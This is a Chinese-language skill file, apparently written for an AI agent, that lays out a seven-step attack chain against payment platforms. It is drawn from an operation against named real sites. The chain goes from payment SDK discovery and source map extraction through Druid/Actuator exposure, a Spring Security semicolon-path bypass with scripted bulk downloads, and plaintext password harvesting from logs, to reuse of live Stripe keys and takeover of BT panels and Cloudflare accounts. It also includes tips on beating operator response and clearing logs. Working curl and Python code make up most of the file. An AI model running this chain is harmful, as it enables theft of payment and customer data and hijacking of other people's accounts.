---
name: payment-sdk-sourcemap-fullchain
description: >-
  支付 SDK → Source Map → 后端全量数据拿取杀伤链。
  适用于电商/SaaS 站嵌入第三方支付 SDK（如 mypay.ink / xflypay / Stripe.js 自建封装）场景。
  从前端 JS SDK 发现支付网关域名 → Source Map 逆向拿到生产 API 路由与密钥 →
  Druid/Actuator 未授权提取 DB Schema → Spring Security 分号路径绕过无鉴权拉全量 →
  操作日志明文密码提权 → Stripe sk_live_ 二次利用 → BT 面板/CF 账户横向。
  触发词：支付SDK、sourcemap、source map、mypay、xflypay、支付聚合、payment gateway、
  payment SDK reverse、Druid 未授权、Spring Security 分号、操作日志明文密码、
  sk_live_、BT面板凭据、Cloudflare 账户接管。
---

# 支付 SDK → Source Map → 后端全量数据杀伤链

> **蒸馏自**：streamlabpeptides.com → paynow.life/znrunpay 实战（2026-09-15/16）
> **定性**：A 级杀伤链 — 从一段前端 JS 到完整平台接管
> **目标须在 scope**

## 真源

| 内容 | 路径 |
|------|------|
| 原始案例报告 | `exports/bot-recovery/paynow_znrunpay_report_20260915/` |
| 关联案卷 | `exports/bot-recovery/streamlabpeptides_20260915/` |
| 方法论参考 | 本文件 `references/streamlab-paynow-case.md` |
| 探针（规划） | `tools/ops/payment_sdk_recon_probe.py`（待实现） |

---

## 一、杀伤链全景（七步）

```
Step 1: 前端 JS SDK 发现
  └─ 商户站 HTML/JS 中嵌入支付 SDK（<script src="https://xxx.ink/sdk.js">）
  └─ 提取 SDK 域名 + JS 源码

Step 2: Source Map 逆向
  └─ 访问 SDK 相关域名的管理后台前端（manager.xxx.com）
  └─ 检查 JS bundle 末尾 //# sourceMappingURL= 注释
  └─ 下载 .js.map → 还原完整源码
  └─ 提取：生产后端 URL、API 路由、APP_KEY、签名算法、认证逻辑

Step 3: Druid / Actuator 未授权
  └─ /druid/ 无认证 → DB Schema + JDBC 内网地址 + SQL 缓存
  └─ /actuator/ 无认证 → heapdump → heap_cred_scan.py

Step 4: Spring Security 认证绕过
  └─ /admin;/xxx/pagelist — 分号截断路径绕过 Spring Security
  └─ 无鉴权遍历全部 /admin/** 管理端点
  └─ 拉取：用户表、商户表、交易表、结算表、域名表、操作日志

Step 5: 操作日志明文密码
  └─ operationlogs/pagelist → requestParams 含明文 access+pwsword
  └─ 提取去重 → 逐个验证登录 → 获取有效 token

Step 6: 二次利用（横向扩展）
  └─ Stripe sk_live_ 密钥 → 客户数据 + 交易数据 + 余额
  └─ BT 面板凭据 → 服务器 shell
  └─ Cloudflare 凭据 + 2FA TOTP → DNS 接管 + 源站 IP 暴露
  └─ COS/OSS 匿名桶 → 文件读写

Step 7: 清理与固证
  └─ 删除测试账户 + 清理操作日志
  └─ 导出全部证据文件 → 写报告
```

---

## 二、每步详细手法

### 2.1 前端 JS SDK 发现

**触发条件**：商户站 HTML 中出现第三方支付域名的 `<script>` 或 `<iframe>`

**操作**：
```bash
# 抓首页 + 所有 JS
curl -sL https://target.com | grep -oE 'https?://[^"'\''> ]+\.(js|sdk|pay)[^"'\''> ]*'

# 排除已知 CDN（jquery/bootstrap/gtag），保留可疑支付域名
# 常见支付 SDK 域名模式：*pay*.ink / *pay*.com / *fly*.com / stripe.js 自封装

# 下载 SDK JS 完整源码
curl -sL https://mypay.ink/sdk.js -o sdk.js
```

**提取信息**：
- 支付网关域名（api.xxx.com / manager.xxx.com）
- 商户 ID / APP_KEY 参数名
- 回调 URL 结构
- 反欺诈参数（fingerprint / device_id）

### 2.2 Source Map 逆向

**触发条件**：Webpack/Vite/React 构建的管理后台

**操作**：
```bash
# 访问管理后台，检查 JS bundle
curl -sI https://manager.xxx.com/static/js/main.xxxx.js | head

# 检查 sourceMappingURL
curl -s https://manager.xxx.com/static/js/main.xxxx.js | tail -5
# //# sourceMappingURL=main.xxxx.js.map ← 如果存在，直接下载

# 下载 Source Map
curl -sL https://manager.xxx.com/static/js/main.xxxx.js.map -o sourcemap.js.map
```

**从 Source Map 提取**：
```python
import json
with open('sourcemap.js.map') as f:
    sm = json.load(f)

# 列出所有源文件路径
for src in sm.get('sources', []):
    print(src)
# 输出示例：
# ../src/api/admin.js       ← API 路由定义
# ../src/utils/request.js   ← axios 封装（含 baseURL）
# ../src/utils/sign.js      ← 签名算法
# ../src/config/index.js    ← APP_KEY、环境变量

# 提取特定源码
for i, src in enumerate(sm['sources']):
    if 'api/' in src or 'config/' in src or 'sign' in src:
        print(f"\n=== {src} ===")
        print(sm['sourcesContent'][i][:2000])
```

**关键信息**：
- `baseURL`：生产后端地址（如 `https://manager.paynow.life/znrunpay/`）
- `APP_KEY`：签名密钥（明文十六进制）
- 签名算法：通常 `MD5(sorted_params + APP_KEY)`
- 所有 API 路由：`/admin/xxx/pagelist`、`/admin/xxx/addUser` 等
- 认证逻辑：Token 存储方式、刷新机制

### 2.3 Druid / Actuator 未授权

**触发条件**：Java Spring Boot 后端

**Druid 快速探测**：
```bash
# Druid 常见路径
for path in /druid/ /druid/index.html /monitoring/druid/ /znrunpay/druid/; do
  code=$(curl -sI "https://target$path" -o /dev/null -w '%{http_code}')
  echo "$path → $code"
done

# 如果 200，提取关键数据
curl -s "https://target/druid/basic.json"           # 版本信息
curl -s "https://target/druid/datasource.json"       # JDBC URL + DB 用户名
curl -s "https://target/druid/sql.json"              # SQL 缓存（含表名、字段名）
curl -s "https://target/druid/wall/tables.json"      # SQL Wall 表统计（所有表名）
curl -s "https://target/druid/weburi.json"           # Web URI 统计（含后端路由）
```

**从 Druid 提取的关键信息**：
- 数据库表名（从 `sql.json` 和 `wall/tables.json`）
- JDBC 内网地址（从 `datasource.json`）
- Java 版本（从 `basic.json`）
- 后端 API 路由（从 `weburi.json`）

### 2.4 Spring Security 分号路径绕过

**原理**：Spring Security 的路径匹配器在匹配 `/admin/**` 时，不会识别 `;` 后的内容，但 Tomcat 会将 `/admin;/xxx` 转发到 `/admin/xxx` 的 Controller。

**⚠️ 版本适用**：Spring Security < 5.8（2023 年前的版本），新版已修复。

**快速验证**：
```bash
# 正常请求（需要认证）
curl -s "https://target/admin/heanuser/pagelist" -w '\n%{http_code}'
# 预期：401 / 302 / 403

# 分号绕过
curl -s "https://target/admin;/heanuser/pagelist" -w '\n%{http_code}'
# 如果返回 200 + JSON 数据 → 绕过成功

# 其他变体（nginx 封堵后尝试）
curl -s "https://target/admin;jsessionid=x/heanuser/pagelist"
curl -s "https://target/./admin/heanuser/pagelist"
curl -s "https://target/admin%3B/heanuser/pagelist"   # URL 编码分号
```

**批量拉取模板**：
```python
import requests, json, time

BASE = "https://target/znrunpay/admin;/"
ENDPOINTS = [
    "heanuser/pagelist",          # 用户表
    "stripeaccount/pagelist",     # 商户账户（含 sk_live_）
    "stripeuser/pagelist",        # 商户（含 API Key）
    "operationlogs/pagelist",     # 操作日志（含明文密码）
    "payoutinfo/pagelist",        # 结算信息（银行/USDT）
    "basedomain/pagelist",        # 域名（含 CF 凭据）
    "paymentrecord/pagelist",     # 交易记录
    "stripelog/pagelist",         # 交易日志
    "stripechannel/pagelist",     # 支付渠道（含 RSA 私钥）
    "stripeuser/stripcompanys",   # 公司列表
]

for ep in ENDPOINTS:
    url = BASE + ep
    params = {"pageIndex": 1, "pageSize": 100}
    r = requests.get(url, params=params, timeout=15)
    print(f"{ep}: {r.status_code} | {len(r.text)} bytes")
    if r.status_code == 200:
        with open(f"{ep.replace('/', '_')}.json", 'w') as f:
            json.dump(r.json(), f, ensure_ascii=False, indent=2)
    time.sleep(0.5)

# 分页拉取全量
def paginate(endpoint, page_size=100):
    all_data = []
    page = 1
    while True:
        r = requests.get(BASE + endpoint, params={"pageIndex": page, "pageSize": page_size})
        data = r.json()
        rows = data.get("rows") or data.get("data", {}).get("rows", [])
        if not rows:
            break
        all_data.extend(rows)
        page += 1
        time.sleep(0.3)
    return all_data
```

### 2.5 操作日志明文密码

**触发条件**：Java 后端将 `requestParams` 原样写入操作日志表

**提取**：
```python
import json, re

logs = paginate("operationlogs/pagelist", 100)

creds = set()
for log in logs:
    params = log.get("requestParams", "")
    m = re.search(r'"access"\s*:\s*"([^"]+)".*?"pwsword"\s*:\s*"([^"]+)"', params)
    if m:
        creds.add((m.group(1), m.group(2)))

print(f"提取 {len(creds)} 对凭据")
for user, pwd in sorted(creds):
    print(f"  {user} : {pwd}")
```

**验证登录**：
```python
for user, pwd in creds:
    r = requests.post(LOGIN_URL, json={"access": user, "pwsword": pwd})
    if r.status_code == 200 and r.json().get("code") == 200:
        token = <REDACTED>"data"]["tokenValue"]
        print(f"✅ {user} — token: {token[:20]}...")
```

### 2.6 Stripe sk_live_ 二次利用

**触发条件**：商户数据中含 Stripe 密钥

```python
import stripe

for key in sk_live_keys:
    stripe.api_key = key
    try:
        balance = stripe.Balance.retrieve()
        customers = stripe.Customer.list(limit=10)
        charges = stripe.Charge.list(limit=10)
        print(f"Key: {key[:12]}... | Balance: {balance} | Customers: {customers.data}")
    except stripe.error.AuthenticationError:
        print(f"Key: {key[:12]}... INVALID")
```

### 2.7 BT 面板 / CF 横向

**BT 面板**（从 stripeaccount 表提取 bt_password 字段）：
```bash
# BT 面板默认端口 8888，部分自定义（如 26398）
# 安全入口路径从 Source Map 或数据库获取
curl -s "https://IP:26398/ff8ea32d/login" -w '%{http_code}'
```

**Cloudflare 接管**（从 basedomain 表提取 cf_email + cf_password + cf_totp_secret）：
```python
import pyotp
totp = pyotp.TOTP(cf_totp_secret)
code = totp.now()
# 使用 CDP/Selenium 登录 Cloudflare Dashboard
```

---

## 三、卡点与踩坑清单（实战血泪）

### 3.1 macOS 工具链坑

| 坑 | 现象 | 解法 |
|----|------|------|
| `grep -P` 不可用 | macOS BSD grep 没有 `-P` (PCRE) | 用 `grep -E` 或 `python3 -c "import re; ..."` |
| `sshpass` 未安装 | SSH 批量登录无法传密码 | 用 `expect` 脚本替代 |
| `com.apple.provenance` 扩展属性 | 文件写入被 macOS 拒绝 | `xattr -d com.apple.provenance <file>` |
| `ddddocr` 算术验证码 | OCR 把 `5*1=?` 识别为 `5t1a` | 先 OCR 再正则匹配算术表达式手动计算 |

### 3.2 网络与协议坑

| 坑 | 现象 | 解法 |
|----|------|------|
| SSL 526 错误 | Cloudflare 到源站 SSL 不匹配 | 用 `-k` 忽略证书或直连 IP + Host 头 |
| SSH `Error reading protocol banner` | Paramiko 连接被 fail2ban 拦截 | 换原生 `ssh` + `expect`；控制并发 |
| DNS dig 超时导致整个脚本挂 | `subprocess.TimeoutExpired` | 设 `timeout=5` + 每个子命令独立 try/catch |
| nginx try_files 假 200 | 所有未知路径返回 SPA `index.html`（219KB） | 检查响应 Content-Type 和 body 长度，219KB = SPA fallback |
| Curl POST 跟 301 变 GET | `curl -X POST` 跟随 301 后变 GET | 用 `curl -L --post301` 或直接指定 `https://` |

### 3.3 数据处理坑

| 坑 | 现象 | 解法 |
|----|------|------|
| `set` 不能切片 | `set(results)[:10]` → TypeError | `list(set(results))[:10]` |
| JSON 空值 NoneType | `len(None)` → TypeError | 先 `if data and len(data)` |
| `too many values to unpack` | Hackertarget API 格式变化 | 直接 `body.decode()` 不拆分 |
| Stripe key 被截断 | 变量里存的是掩码（`sk_live_***q...`） | 从原始 JSON 取完整 `accountKey` 字段 |
| 分页总量不一致 | pagelist 返回 total=335 但只拉到 278 | 必须循环 pageIndex 直到空行，不信 total |

### 3.4 认知坑（最致命）

| 坑 | 错误认知 | 正确认知 |
|----|----------|----------|
| 静态站 = 没有后端 | 以为 404 就没有 PHP | WP 可能在 VPN 内运行，静态只是公网展示层 |
| 同网段 = 同管理员 | 以为 .100 和 .193 同一人 | SSH 指纹不同 = 不同管理员，机房共享 IP 段 |
| Druid sql.json 能执行 SQL | 以为 POST sql.json 能查数据 | `ResultCode: 1, Content: null` → SQL 执行被禁 |
| 支付 SDK 域名 = 终端数据 | 以为 mypay.ink 存着用户数据 | SDK 只是前端，用户数据在 WP MySQL 里 |
| 运维不会发现 | 以为拉数据不会被检测 | 6-8 小时后运维发现，批量改密 + nginx 封堵 |
| 一个 curl 能解决分页 | 以为 100 条就是全量 | 必须循环分页，有些表有 2,391 页 |
| BT 面板路径是 /login | 以为标准路径 | BT 面板有"安全入口"机制，/login 返回 404 |

### 3.5 时序坑

| 阶段 | 时间窗口 | 教训 |
|------|----------|------|
| 发现绕过 → 拉全量 | 约 6 小时 | 发现绕过后**立刻全量导出**，不要先探再回头拉 |
| 运维响应 | 6-8 小时 | 凌晨打的话，白天运维上班就会发现 |
| 密码改了才发现 | token 过期后 | **拿到 token 立刻做完所有操作**，不要分段 |
| 证据先导出 | 要在权限丢失前 | 发现敏感端点 → 立刻 JSON 全量存盘 → 再分析 |

---

## 四、静态 WordPress 站渗透决策树

本案例中 streamlabpeptides.com 是静态 WP 导出，攻击面极窄。总结决策树：

```
WP 站 → PHP 端点（wp-login/xmlrpc/rest api）全 404？
  │
  ├─ 是 → 静态导出站
  │    ├─ RSS Feed 还在？(/feed/) → 提取 WP 版本 + 作者
  │    ├─ Gravatar hash 可查？ → 管理员身份
  │    ├─ WhatsApp/Contact 插件 JSON？ → 手机号 + 邮箱
  │    ├─ SSL 证书 SAN？ → 隐藏子域（vpn1）
  │    ├─ crt.sh 历史？ → VPN / staging / admin 子域
  │    ├─ 支付集成 JS？ → **本杀伤链入口**
  │    ├─ /backups/ 403？ → 目录存在但禁止列目录 → 文件名爆破
  │    ├─ /wp-content/uploads/ 403？ → 日期子目录探测
  │    └─ 同 IP 反查？ → 其他站点横向
  │
  └─ 否 → 正常 WP 渗透流程（REST API 枚举 → xmlrpc 爆破 → 插件漏洞）
```

---

## 五、检查清单（复用模板）

- [ ] 首页 HTML 中搜索第三方支付域名（`<script src=`、`<iframe`）
- [ ] 下载支付 SDK JS 完整源码
- [ ] 检查 SDK 相关域名的管理后台
- [ ] 检查 JS bundle 是否有 `.js.map` Source Map
- [ ] 从 Source Map 提取：baseURL、APP_KEY、API 路由、签名算法
- [ ] 探测 /druid/ 未授权（basic/datasource/sql/wall/weburi）
- [ ] 探测 /actuator/ 未授权
- [ ] 尝试 Spring Security 分号绕过：`/admin;/xxx`
- [ ] 如绕过成功，**立刻全量导出**所有 pagelist 端点
- [ ] 检查 operationlogs 中的明文密码
- [ ] 提取 Stripe sk_live_ 密钥并验证
- [ ] 提取 BT 面板凭据并验证
- [ ] 提取 Cloudflare 凭据 + 2FA TOTP 并验证
- [ ] 检查 addUser 等写入端点是否也绕过了认证
- [ ] 证据全量存盘后再分析
- [ ] 清理测试痕迹（删除测试账户、确认日志状态）

---

## 六、关联技能

| 技能 | 场景 |
|------|------|
| `spring-exploitation` | Spring 全生态漏洞（含分号绕过原理） |
| `spring-actuator-cloud-takeover` | Actuator → heapdump → 云主机接管 |
| `heapdump-credential-hunter` | heapdump 凭证提取（正则+蓝鸟对象图） |
| `spa-protocol-reverse` | SPA 前端 Source Map 逆向 |
| `sensitive-dir-dump` | 开放目录 + 凭证猎取 |
| `cloudflare-bypass` | Cloudflare 绕过找源站 |
| `cdn-origin-tracing` | CDN 真实 IP 溯源 |
| `bt-panel-pentest` | 宝塔面板渗透 |
| `business-logic-payment` | 支付业务逻辑测试 |
| `credential-harvest` | 凭据收割 |
